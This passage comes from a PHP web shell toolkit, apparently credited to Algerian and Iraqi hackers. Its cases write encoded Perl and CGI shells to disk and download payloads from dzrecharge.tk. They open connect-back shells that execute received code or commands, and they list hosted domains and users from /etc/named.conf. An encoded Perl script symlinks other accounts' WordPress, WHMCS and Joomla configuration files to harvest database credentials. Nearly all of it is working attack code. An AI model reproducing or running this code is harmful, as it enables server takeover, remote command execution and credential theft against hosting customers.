YWNrLWJvb2submV0IC0tPjxicj48L2ZvbnQ+PC9iPjxwIGFsaWduPSdjZW50ZXInPjxmb250IGZh
Y2U9J1RhaG9tYScgc3R5bGU9J2ZvbnQtc2l6ZTogOXB0Jz48Zm9udCBjb2xvcj0nI0ZGRkZGRic+
Q29kZWQgQnk8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjAwMDAnPiBJcmFRaWFOLXIweCA8L2ZvbnQ+
PGZvbnQgY29sb3I9JyNGRkZGRkYnPiB8PC9mb250Pjxmb250IGNvbG9yPScjRkYwMDAwJz4gPGEg
aHJlZj0naHR0cDovL3d3dy5oYWNrLWJvb2submV0L3ZiLyc+d3d3LkhhY2stQm9vay5uZXQ8L2E+
PC9mb250PjwvZm9udD48L3A+PHAgYWxpZ249J2NlbnRlcic+PGZvbnQgZmFjZT0nVGFob21hJyBz
dHlsZT0nZm9udC1zaXplOiA5cHQnPkdyRUV0eiBUbzwvZm9udD48Zm9udCBmYWNlPSdUYWhvbWEn
IGNvbG9yPScjRkZGRkZGJyBzdHlsZT0nZm9udC1zaXplOiA5cHQnPiBbI11+PC9mb250Pjxmb250
IGZhY2U9J1RhaG9tYScgY29sb3I9JyNDQ0NDQ0MnIHN0eWxlPSdmb250LXNpemU6IDlwdCc+IEth
cmFyIGFsU2hhTWk8L2ZvbnQ+PGZvbnQgZmFjZT0nVGFob21hJyBjb2xvcj0nI0ZGRkZGRicgc3R5
bGU9J2ZvbnQtc2l6ZTogOXB0Jz58IEFuZCBBbGwgTXkgRnJpZW5kczwvcD48L2ZvbnQ+PGI+PGZv
bnQgZmFjZT0nVGFob21hJyBzaXplPScyJyBjb2xvcj0nI0ZGRkZGRic+PC9odG1sPiI7CiMgZGVj
cnlwdGVkOgojIGV2YWwoZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJ0RaUkh6cVJvQWdYM2M0cmFk
WlZZNE9GRHJaNFJKdkdRMkFSeU04Sjc3emw5L3lkNFV1aEYvT2RYZnNUZDcvS3BoNktMdC94M0Vx
ODVSZncveTlNeHkzLy9KV1EyS3V5MnhMNEV4NW96cFVNeDBsRGZ0UmM0ZlE0ZTI1R2kxQ0FCaE1F
d0Juc3dwQnNNQW9rU1RIOUtrL3JRMEcxcW02b0xjTjFvUlgzb2NvZy85ZjJHNjh0NDJ0SHJzYW4x
M1l0ZkJtenhDY1Jld05ablNDZ3FFK0o1RVB2bVVONktwbnJKREphdUNqTG05SThVSnE4NXVNcDdI
Q2NuVk10emlGK2dKWWU2K05xdGdxbTg3azdWUHFmdmJkczZPWGoyV0F1dTdsMFJRdXZIRmk0bmF6
cm1UZFZ2WFlLY2xQTjZnMkdkS292R2JYUmk3RW5sN295TjYzU1Myd0lkc3NydkgzRVEwK0tVUFk4
d0QycHBVMGVnMVBEcU83ay81bXdiTkU2emVUTHRDV0ZYSW12cWs0dXFFZVpaT3BkUlMwU3BFRnFq
TU04R2dTNkxQQXlMZ2VSYk9JTzA5c1lZdG16NjNKdk1sUWFmTFlPOTRBbVB2ZUhNVmg4OW1tRml6
L21xem5MUWRXSGZRU2gya1loUVN4SkhwZ21oU2NZcWlFV1VtYXFDMWhWcWRCS2djYnBoOWRZN2lj
NXdaTldiNy9KRkd3SnNnbC9rK081ZitlZEU3ZWtWZElGY0YvMytmSHhTdWJ3TlJiOXE1ZXlMUkNx
Q0ZLR29yb0RTVTFYTkZkS0xUVVhhMmUxRlRnTlBnSmYrSUZCN3l4NitaNFZGVGRCM2Z5b3hLT21t
cStSUnZ4TDVTSGdoNUJ5anN4Mjhrck92dHpXVjd3NEhxQ2lEUENGemZ6WnN5WHp2dFJxNmc0aUcz
NmZpYU1GVUN0eVk0bzdwdXRzaHRDSkdid3gyblE1MzlUSGpaQlFWdWtrRy95SFYzV0h2c21CUHlL
eHFVeEdyU1BFVjk1ajhwYWs4ZnJZeGFpSUtXako4d0pwM0Z1ZWZWZ2liTnhzK1drMWN0cXoyK3ZQ
VjhtZE5tdEpvSFRGWXByVVE3dE9Fd1pzcVB6WFJta2VXU3VtcFJZTmZmUjQrNVRDWjFXUFlFUmZi
VDAvbWRVaW9ibStPMlBHKzZDckoyNlZpeUJvRlM2dEFJZ2g1Sm1QM1BWYXdZSzVxUUc3VUJ5b2NX
OHBOMTEvaW91blpjZWp0VkFHaEduUE51QVdLOWM1SmRIbmRtZ01CUjhpbjNUR2JxeTN6L1lrMFNs
Zy9Jc2hHc0lsYjFNaVB1UmJCVWdRZnkrY3dyQ09HcUU0dHdKMkxXbTQ3cFJDTnljckl3Y0thczdC
Q3Q3K2diRFozcXYvNDdNQTVyTmpKbExDRDJ6SzhCTUhObURROTRDMldpZ1hna0VTZnIzOWNnVyty
Wlh5SmtweElKaU5NNTNGdTlBNG5vUWpUS0tUK1hHcUtaYXIyS0l2WVNOdkdZcjZYVVdvL3R4NFlS
UWFKQ0RQNThKRHFkN1RCUFlwME9OZll4YnQ5Tit1ZGhyT2pIRk1BUXB4eFg3NWEvWVE0OG0waXZz
dVk0UlhJVm9xcnZ0QW45UGVuRWZlcVAzMU0xTlhzV2hkZ3dwRWtDd21QYW0vbDFyZ3BNc2ZEZDJr
a2dJU3pLTGQvNlFnak1yb2dEVjlhYkZ1TUhsU0wzOFdNTkFTeWlWREE3TzZOWnVLUXVQYzh5K0cx
OU8rSFdJKytCOUlvZTVHcUdyYmoyTFdHdkNZNG56ZUlKWVdjZUpVTkQ5WXQvL0VhcmZxckloOVg1
VC80RnZYOUt5RHNjanFhbXNOYWM4cWlvZzViaHdWMG5NaktIRzZqaUNvN21zSTlXNG1rVTUwaS9Y
VE5NMGEwVENjWjl4TTl2aWJ5bWFyMzdkSGRUMHZaOHJWR0lYU1Z0dkZLbytTZDNKTEhLYjQ1emd5
TUw4N0xHbm5IUDBjaXVmT2JQWElOeGliVnFvcEtZN2R2VVRCb3d2dGFWTnJUb2w3ZnBYTTA1a0Vn
MVRPZW1oTXN1TTNBUHJvSnAyNTBmYTJhbk5ua0Z4dG9kYUlRU3ptYVJZeGZXanptT01nVEovNWFl
VVVhczZLa2VZK1A0ckRCbVZUalhPcS9mMVpqcExGcFp6bTR5MUc3MHk0a0tXWG4wZU9DM3VWZVVn
OGY0YktRQUM1Z21pRnBHSVpaOE05ZmYvNzgrZnZYLy83N0x3PT0nKSkpOwoKPz4=';

$file = fopen("perlbypass.php" ,"w+");
$write = fwrite ($file ,base64_decode($perltoolss));
fclose($file);
� �echo "<iframe src=perltools/perlbypass.php width=100% height=100%
frameborder=0></iframe> ";
break;
case "PHP_10":

� � mkdir('autoroot', 0755);
� � chdir('autoroot');
$file = fopen("autoroot.txt" ,"w+");

$sa=file_get_contents('http://dzrecharge.tk/pv8L/1.txt');

$write = fwrite ($file ,$sa);

fclose($file);

if ($write) {

echo "The File Was Created Successfuly.</br>";

}
else {echo'"error"';}

$chm = chmod("autoroot.txt" , 0755);

if ($chm == true){
� � echo "chmoded the file to 755";
}else{
� � echo "sorry file didn't chmoded";
}
break;
case "PHP_11":

� � mkdir('cgi', 0755);
� � chdir('cgi');
� � $file = fopen("jeentel" ,"w+");
� � $sa=file_get_contents('http://dzrecharge.tk/pv8L/jeentel');
� � $write = fwrite ($file ,$sa);
� � chmod("jeentel",0777);
� � $file = fopen("cgiPerl.dz" ,"w+");
� � $sa=file_get_contents('http://dzrecharge.tk/pv8L/dz.txt');
� � $write = fwrite ($file ,$sa);
� � chmod("cgiPerl.dz",0755);
� � � � $kokdosya = ".htaccess";
� � � � $dosya_adi = "$kokdosya";
� � � � $dosya = fopen ($dosya_adi , 'w') or die ("Dosya
a&#231;&#305;lamad&#305;!");
� � � � $metin = "AddType application/x-httpd-cgi .dz
AddHandler cgi-script .dz";
� � � � fwrite ( $dosya , $metin ) ;
� � � � fclose ($dosya);
� �echo "<iframe src=cgi/cgiPerl.dz width=100% height=100%
frameborder=0></iframe> ";
break;
case "PHP_12":

{
� � $ipz =$_SERVER["REMOTE_ADDR"];
� � $portz ="22";
� � if ($ipz == "" && $portz == ""){echo "Please fill IP Adress & The
listen Port";}
� � else
� � {
� � � � $ipaddr = $ipz;
� � � � $port = $portz;
� � � � if (FALSE !== strpos($ipaddr, ":")) {$ipaddr = "[". $ipaddr ."]";}
� � � � if (is_callable('stream_socket_client'))
� � � � {
� � � � � � $msgsock = stream_socket_client("tcp://{$ipaddr}:{$port}");
� � � � � � if (!$msgsock){die();}
� � � � � � $msgsock_type = 'stream';
� � � � }
� � � � elseif (is_callable('fsockopen'))
� � � � {
� � � � � � $msgsock = fsockopen($ipaddr,$port);
� � � � � � if (!$msgsock) {die(); }
� � � � � � $msgsock_type = 'stream';
� � � � }
� � � � elseif (is_callable('socket_create'))
� � � � {
� � � � � � $msgsock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
� � � � � � $res = socket_connect($msgsock, $ipaddr, $port);
� � � � � � if (!$res) {die(); }
� � � � � � $msgsock_type = 'socket';
� � � � }
� � � � else {die();}
� � � � switch ($msgsock_type)
� � � � {
� � � � � � case 'stream': $len = fread($msgsock, 4); break;
� � � � � � case 'socket': $len = socket_read($msgsock, 4); break;
� � � � }
� � � � if (!$len) {die();}
� � � � $a = unpack("Nlen", $len);
� � � � $len = $a['len'];
� � � � $buffer = '';
� � � � while (strlen($buffer) < $len)
� � � � {
� � � � � � switch ($msgsock_type)
� � � � � � {
� � � � � � � � case 'stream': $buffer .= fread($msgsock,
$len-strlen($buffer));
� � � � � � � � break;
� � � � � � � � case 'socket': $buffer .= socket_read($msgsock,
$len-strlen($buffer));
� � � � � � � � break;
� � � � � � }
� � � � }
� � � � eval($buffer);
� � � � echo "[*] Connection Terminated";
� � � � die();
� � }
}
break;
case "PHP_13":

{
� � � � $env = array('PATH' =>
'/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin');
� � � � $descriptorspec = array(
� � � � 0 => array("pipe","r"),
� � � � 1 => array("pipe","w"),
� � � � 2 => array("file","/tmp/log.txt","a"));
� � � � $ipx =$_SERVER["REMOTE_ADDR"];
� � � � $portx ="22";
� � � � $proto=getprotobyname("tcp");
� � � � if(($sock=socket_create(AF_INET,SOCK_STREAM,$proto))<0)
� � � � { die("[-] Socket Create Faile");}
� � � � if(($ret=socket_connect($sock,$ipx,$portx))<0)
� � � � { die("[-] Connect Faile");}
� � � � else{
� � � � $message="----------------------PHP Connect-Back--------------------\n";
� � � � $message.="----------------------- SyRiAn Sh3ll --------------------\n";
� � � � socket_write($sock,$message,strlen($message));
� � � � $cwd=str_replace('\\','/',dirname(__FILE__));
� � � � while($cmd=socket_read($sock,65535,$proto))
� � � � � �{
� � � � � �if(trim(strtolower($cmd))=="exit"){socket_write($sock,"Bye
Bye\n");exit;}
� � � � � �else{
� � � � � � $process = proc_open($cmd, $descriptorspec, $pipes, $cwd, $env);
� � � � � � if (is_resource($process)) {
� � � � � � fwrite($pipes[0], $cmd);
� � � � � � fclose($pipes[0]);
� � � � � � $msg=stream_get_contents($pipes[1]);
� � � � � � socket_write($sock,$msg,strlen($msg));
� � � � � � fclose($pipes[1]);
� � � � � � $return_value = proc_close($process);}
� � � � � �}
� � � � � � }
� � � � }
� � }
break;
case "PHP_14":

echo "<title># Domains & Users</title>
<style>
body,table{background: black; font-family:Verdana,tahoma; color:
white; font-size:10px; }
A:link {text-decoration: none;color: red;}
A:active {text-decoration: none;color: red;}
A:visited {text-decoration: none;color: red;}
A:hover {text-decoration: underline; color: red;}
#new,input,table,td,tr,#gg{text-align:center;border-style:solid;text-decoration:bold;}
tr:hover,td:hover{text-align:center;background-color: #FFFFCC; color:green;}
</style>
<p align=center># Domains & Users</p>
<p align=center>Karar alShaMi t00l with PHP .. Maked By Lagripe-Dz
..?!</p><center>";

$d0mains = @file("/etc/named.conf");

if(!$d0mains){ die("<b># can't ReaD -> [ /etc/named.conf ]"); }

echo "<table align=center border=1>
<tr bgcolor=green><td>d0mains</td><td>users</td></tr>";

foreach($d0mains as $d0main){

if(eregi("zone",$d0main)){

preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();

if(strlen(trim($domains[1][0])) > 2){

$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));

echo "<tr><td><a
href=http://www.".$domains[1][0]."/>".$domains[1][0]."</a></td><td>".$user['name']."</td></tr>";
flush();

}}}

echo "</table>
<p align='center'>
MaDe in AlGeriA 2o11 (r)
</p>
";
break;
case "PHP_15":
� � mkdir('ShowsourceRead', 0755);
� � � � chdir('ShowsourceRead');

$filexc = 'ZWNobyAiPGh0bWw+CjwvdGQ+PC90cj48L3RhYmxlPjxmb3JtIG1ldGhvZD0nUE9TVCcgZW5jdHlw
ZT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YScgPgo8L3RkPjwvdHI+PC90YWJsZT48Zm9ybSBtZXRob2Q9
J1BPU1QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnID4KPGJyPgo8Yj5zaG93X3NvdXJj
ZSAgOiA8L2I+PGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J3Nob3cnIHZhbHVlPScnIHNpemU9JzU5
JyBzdHlsZT0nY29sb3I6ICNmZmZmZmY7IGJvcmRlcjogMXB4IGRvdHRlZCByZWQ7IGJhY2tncm91
bmQtY29sb3I6ICMwMDAwMDAnPjwvcD4KPGI+aGlnaGxpZ2h0X2ZpbGUgOiA8L2I+PGlucHV0IHR5
cGU9J3RleHQnIG5hbWU9J2hpZ2gnIHZhbHVlPScnIHNpemU9JzU5JyBzdHlsZT0nY29sb3I6ICNm
ZmZmZmY7IGJvcmRlcjogMXB4IGRvdHRlZCAjZmZmZmZmOyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAw
MDAwJz48L3A+CjxpbnB1dCB0eXBlPSdzdWJtaXQnJyAgdmFsdWU9J1JlYWQnICBzdHlsZT0nY29s
b3I6IHJlZDsgYm9yZGVyOiAxcHggZG90dGVkIG9yYW5nZTsgYmFja2dyb3VuZC1jb2xvcjogZ3Jl
ZW4nPjwvZm9ybTwvcD4KPC9mb3JtPC9wPiI7Cjw/cGhwCmlmKGVtcHR5KCRfUE9TVFsnc2hvdydd
KSkKewp9CmVsc2UKewokcyA9ICRfUE9TVFsnc2hvdyddOwplY2hvICI8Yj48aDE+PGZvbnQgc2l6
ZT0nNCcgY29sb3I9J3JlZCc+c2hvd19zb3VyY2U8L2ZvbnQ+PC9oMT4iOwokc2hvdyA9IHNob3df
c291cmNlKCRzKTsKfQppZihlbXB0eSgkX1BPU1RbJ2hpZ2gnXSkpCnsKfQplbHNlCnsKJGggPSAk
X1BPU1RbJ2hpZ2gnXTsKZWNobyAiPGI+PGgxPjxmb250IHNpemU9JzQnIGNvbG9yPSdncmVlbic+
aGlnaGxpZ2h0X2ZpbGU8L2ZvbnQ+PC9oMT4iOwplY2hvICI8YnI+IjsKJGhpZ2ggPSBoaWdobGln
aHRfZmlsZSgkaCk7Cn0KPz4=';

$file = fopen("read.php" ,"w+");
$write = fwrite ($file ,base64_decode($filexc));
fclose($file);
� �echo "<iframe src=ShowsourceRead/read.php width=100% height=100%
frameborder=0></iframe> ";
break;
case "PHP_16":
� � mkdir('configler', 0755);
� � chdir('configler');
� � � � $kokdosya = ".htaccess";
� � � � $dosya_adi = "$kokdosya";
� � � � $dosya = fopen ($dosya_adi , 'w') or die ("Dosya
a&#231;&#305;lamad&#305;!");
� � � � $metin = "AddHandler cgi-script .izo";
� � � � fwrite ( $dosya , $metin ) ;
� � � � fclose ($dosya);
$configshell = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29udGVudC10eXBl
OiB0ZXh0L2h0bWxcblxuIjsNCnByaW50JzwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9E
VEQgWEhUTUwgMS4wIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRt
bDEvRFREL3hodG1sMS10cmFuc2l0aW9uYWwuZHRkIj4NCjxodG1sIHhtbG5zPSJodHRwOi8vd3d3
LnczLm9yZy8xOTk5L3hodG1sIj4NCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1M
YW5ndWFnZSIgY29udGVudD0iZW4tdXMiIC8+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5
cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIgLz4NCjx0aXRsZT5bfl0gQ3li
M3ItRFogQ29uZmlnIC0gW35dIDwvdGl0bGU+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KLm5l
d1N0eWxlMSB7DQogZm9udC1mYW1pbHk6IFRhaG9tYTsNCiBmb250LXNpemU6IHgtc21hbGw7DQog
Zm9udC13ZWlnaHQ6IGJvbGQ7DQogY29sb3I6ICMwMEZGRkY7DQogIHRleHQtYWxpZ246IGNlbnRl
cjsNCn0NCjwvc3R5bGU+DQo8L2hlYWQ+DQonOw0Kc3ViIGxpbHsNCiAgICAoJHVzZXIpID0gQF87
DQokbXNyID0gcXh7cHdkfTsNCiRrb2xhPSRtc3IuIi8iLiR1c2VyOw0KJGtvbGE9fnMvXG4vL2c7
IA0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2NvbmZpZ3Vy
ZS5waHAnLCRrb2xhLictc2hvcC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJs
aWNfaHRtbC9hbWVtYmVyL2NvbmZpZy5pbmMucGhwJywka29sYS4nLWFtZW1iZXIudHh0Jyk7DQpz
eW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnLmluYy5waHAnLCRrb2xh
LictYW1lbWJlcjIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwv
bWVtYmVycy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1tZW1iZXJzLnR4dCcpOw0Kc3ltbGlu
aygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5waHAnLCRrb2xhLicyLnR4dCcp
Ow0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2Nv
bmZpZy5waHAnLCRrb2xhLictZm9ydW0udHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicv
cHVibGljX2h0bWwvYWRtaW4vY29uZi5waHAnLCRrb2xhLic1LnR4dCcpOw0Kc3ltbGluaygnL2hv
bWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRrb2xhLic0LnR4dCcp
Ow0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCRr
b2xhLictd3AxMy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9i
bG9nL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd3AtYmxvZy50eHQnKTsNCnN5bWxpbmsoJy9ob21l
LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25mX2dsb2JhbC5waHAnLCRrb2xhLic2LnR4dCcpOw0K
c3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGUvZGIucGhwJywka29s
YS4nNy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25uZWN0
LnBocCcsJGtvbGEuJzgudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0
bWwvbWtfY29uZi5waHAnLCRrb2xhLic5LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4n
L3B1YmxpY19odG1sL2luY2x1ZGUvY29uZmlnLnBocCcsJGtvbGEuJzEyLnR4dCcpOw0Kc3ltbGlu
aygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCcs
JGtvbGEuJy1qb29tbGEudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0
bWwvdmIvaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJy12Yi50eHQnKTsNCnN5bWxpbmsoJy9o
b21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nLWlu
Y2x1ZGVzLXZiLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3do
bS9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy13aG0xNS50eHQnKTsNCnN5bWxpbmsoJy9ob21l
LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXdo
bWMxNi50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jcy9j
b25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy13aG1jcy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycu
JHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXN1
cHBvcnQudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmln
dXJhdGlvbi5waHAnLCRrb2xhLicxd2htY3MudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2Vy
LicvcHVibGljX2h0bWwvc3VibWl0dGlja2V0LnBocCcsJGtvbGEuJy13aG1jczIudHh0Jyk7DQpz
eW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50cy9jb25maWd1cmF0aW9u
LnBocCcsJGtvbGEuJy1jbGllbnRzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1
YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1jbGllbnQudHh0Jyk7
DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50ZXMvY29uZmlndXJh
dGlvbi5waHAnLCRrb2xhLictY2xpZW50cy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIu
Jy9wdWJsaWNfaHRtbC9iaWxsaW5nL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWJpbGxpbmcu
dHh0Jyk7IA0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21hbmFnZS9jb25m
aWd1cmF0aW9uLnBocCcsJGtvbGEuJy1iaWxsaW5nLnR4dCcpOyANCnN5bWxpbmsoJy9ob21lLycu
JHVzZXIuJy9wdWJsaWNfaHRtbC9teS9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1iaWxsaW5n
LnR4dCcpOyANCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9teXNob3AvY29u
ZmlndXJhdGlvbi5waHAnLCRrb2xhLictYmlsbGluZy50eHQnKTsgDQp9DQppZiAoJEVOVnsnUkVR
VUVTVF9NRVRIT0QnfSBlcSAnUE9TVCcpIHsNCiAgcmVhZChTVERJTiwgJGJ1ZmZlciwgJEVOVnsn
Q09OVEVOVF9MRU5HVEgnfSk7DQp9IGVsc2Ugew0KICAkYnVmZmVyID0gJEVOVnsnUVVFUllfU1RS
SU5HJ307DQp9DQpAcGFpcnMgPSBzcGxpdCgvJi8sICRidWZmZXIpOw0KZm9yZWFjaCAkcGFpciAo
QHBhaXJzKSB7DQogICgkbmFtZSwgJHZhbHVlKSA9IHNwbGl0KC89LywgJHBhaXIpOw0KICAkbmFt
ZSA9fiB0ci8rLyAvOw0KICAkbmFtZSA9fiBzLyUoW2EtZkEtRjAtOV1bYS1mQS1GMC05XSkvcGFj
aygiQyIsIGhleCgkMSkpL2VnOw0KICAkdmFsdWUgPX4gdHIvKy8gLzsNCiAgJHZhbHVlID1+IHMv
JShbYS1mQS1GMC05XVthLWZBLUYwLTldKS9wYWNrKCJDIiwgaGV4KCQxKSkvZWc7DQogICRGT1JN
eyRuYW1lfSA9ICR2YWx1ZTsNCn0NCmlmICgkRk9STXtwYXNzfSBlcSAiIil7DQpwcmludCAnDQo8
Ym9keSBjbGFzcz0ibmV3U3R5bGUxIiBiZ2NvbG9yPSIjMDAwMDAwIj4NCjxwPkN5YjNyLWR6IENv
bmZpZyBGdWNrIFNjcmlwdDwvcD4NCjxwPjxmb250IGNvbG9yPSIjQzBDMEMwIj5bPC9mb250PiBD
b2RlZCBCeSBDeWIzci1EWiA8Zm9udCBjb2xvcj0iI0MwQzBDMCI+fDwvZm9udD4gDQreYSBATy4g
ZskcZS8g3mE8c3BhbiBpZD0icmVzdWx0X2JveCIgY2xhc3M9InNob3J0X3RleHQiIGxhbmc9ImVu
Ij48c3BhbiBzdHlsZSB0aXRsZT4NCjxmb250IGNvbG9yPSIjQzBDMEMwIj58PC9mb250Pjwvc3Bh
bj48L3NwYW4+IDxhIGhyZWY9Imh0dHA6Ly93d3cud3d3LnNlYzRldmVyLmNvbSI+DQo8c3BhbiBz
dHlsZT0idGV4dC1kZWNvcmF0aW9uOiBub25lIj48Zm9udCBjb2xvcj0iIzAwRkYwMCI+d3d3LnNl
YzRldmVyLmNvbTwvZm9udD48L3NwYW4+PC9hPiANCjxmb250IGNvbG9yPSIjQzBDMEMwIj5dPC9m
b250PjwvcD4NCjxmb3JtIG1ldGhvZD0icG9zdCI+DQo8dGV4dGFyZWEgbmFtZT0icGFzcyIgc3R5
bGU9ImJvcmRlcjoxcHggZG90dGVkICMwMEZGRkY7IHdpZHRoOiA1NDNweDsgaGVpZ2h0OiA0MjBw
eDsgYmFja2dyb3VuZC1jb2xvcjojMEMwQzBDOyBmb250LWZhbWlseTpUYWhvbWE7IGZvbnQtc2l6
ZTo4cHQ7IGNvbG9yOiMwMEZGRkYiICA+PC90ZXh0YXJlYT48YnIgLz4NCiZuYnNwOzxwPg0KPGlu
cHV0IG5hbWU9InRhciIgdHlwZT0idGV4dCIgc3R5bGU9ImJvcmRlcjoxcHggZG90dGVkICMwMEZG
RkY7IHdpZHRoOiAyMTJweDsgYmFja2dyb3VuZC1jb2xvcjojMEMwQzBDOyBmb250LWZhbWlseTpU
YWhvbWE7IGZvbnQtc2l6ZTo4cHQ7IGNvbG9yOiMwMEZGRkY7ICIgIC8+PGJyIC8+DQombmJzcDs8
L3A+DQo8cD4NCjxpbnB1dCBuYW1lPSJTdWJtaXQxIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJHZXQg
Q29uZmlnIiBzdHlsZT0iYm9yZGVyOjFweCBkb3R0ZWQgIzAwRkZGRjsgd2lkdGg6IDk5OyBmb250
LWZhbWlseTpUYWhvbWE7IGZvbnQtc2l6ZToxMHB0OyBjb2xvcjojMDBGRkZGOyB0ZXh0LXRyYW5z
Zm9ybTp1cHBlcmNhc2U7IGhlaWdodDoyMzsgYmFja2dyb3VuZC1jb2xvcjojMEMwQzBDIiAvPjwv
cD4NCjwvZm9ybT4nOw0KfWVsc2V7DQpAbGluZXMgPTwkRk9STXtwYXNzfT47DQokeSA9IEBsaW5l
czsNCm9wZW4gKE1ZRklMRSwgIj50YXIudG1wIik7DQpwcmludCBNWUZJTEUgInRhciAtY3pmICIu
JEZPUk17dGFyfS4iLnRhciAiOw0KZm9yICgka2E9MDska2E8JHk7JGthKyspew0Kd2hpbGUoQGxp
bmVzWyRrYV0gID1+IG0vKC4qPyk6eDovZyl7DQombGlsKCQxKTsNCnByaW50IE1ZRklMRSAkMS4i
LnR4dCAiOw0KZm9yKCRrZD0xOyRrZDwxODska2QrKyl7DQpwcmludCBNWUZJTEUgJDEuJGtkLiIu
dHh0ICI7DQp9DQp9DQogfQ0KcHJpbnQnPGJvZHkgY2xhc3M9Im5ld1N0eWxlMSIgYmdjb2xvcj0i
IzAwMDAwMCI+DQo8cD5Eb25lICEhPC9wPg0KPHA+Jm5ic3A7PC9wPic7DQppZigkRk9STXt0YXJ9
IG5lICIiKXsNCm9wZW4oSU5GTywgInRhci50bXAiKTsNCkBsaW5lcyA9PElORk8+IDsNCmNsb3Nl
KElORk8pOw0Kc3lzdGVtKEBsaW5lcyk7DQpwcmludCc8cD48YSBocmVmPSInLiRGT1JNe3Rhcn0u
Jy50YXIiPjxmb250IGNvbG9yPSIjMDBGRjAwIj4NCjxzcGFuIHN0eWxlPSJ0ZXh0LWRlY29yYXRp
b246IG5vbmUiPkNsaWNrIEhlcmUgVG8gRG93bmxvYWQgVGFyIEZpbGU8L3NwYW4+PC9mb250Pjwv
YT48L3A+JzsNCn0NCn0NCiBwcmludCINCjwvYm9keT4NCjwvaHRtbD4iOw==';

$file = fopen("config.izo" ,"w+");
$write = fwrite ($file ,base64_decode($configshell));
fclose($file);
� � chmod("config.izo",0755);
� �echo "<iframe src=configler/config.izo width=100% height=100%
frameborder=0></iframe> ";
break;
case "PHP_17":

$bizci = 'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uCgojICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMg
IyAjICMgIyAjICMgIyAjICMgIyAjICMKIyAgIGQwMHIucHkgMC4zYSAocmV2ZXJzZXxiaW5kKS1z
